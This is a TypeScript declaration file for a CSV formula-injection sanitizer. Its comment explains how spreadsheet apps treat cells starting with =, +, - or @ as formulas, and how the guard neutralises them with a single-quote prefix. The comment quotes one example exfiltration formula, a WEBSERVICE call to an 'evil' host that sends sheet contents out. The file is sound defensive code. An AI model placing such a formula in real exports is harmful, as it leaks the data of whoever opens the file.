/**
 * CSV formula-injection guard - CWE-1236 / OWASP "CSV Injection".
 *
 * Spreadsheet apps (Excel, LibreOffice, Google Sheets) evaluate a cell as a
 * FORMULA when its first character is  =  +  -  @  or a leading TAB / CR / LF.
 * A dimension label such as  =WEBSERVICE("http://evil/?x="&A1)  exfiltrates the
 * opened sheet on first render. RFC-4180 quote-doubling does NOT stop this:
 * Excel strips the CSV quotes on import and still sees the leading "=".
 *
 * Fix: prefix a single quote (') so the cell is forced to text. Plain numbers
 * - including negatives and en/ru decimal styles (-5, -3,50, -1 234,5, .5, ,5)
 * - are exempted, so numeric columns keep their type and SUM/AVG keep working
 * in the opened sheet. This is a true no-op on numerics, not a visual one.
 *
 * CANONICAL SOURCE. Copied byte-identical into each plugin (see root CLAUDE.md
 * "CSV formula-injection guard" sync block). Do NOT edit the copies directly.
 */
export declare function sanitizeCsvCell(value: string | number | null | undefined): string;
//# sourceMappingURL=sanitizeCsvCell.d.ts.map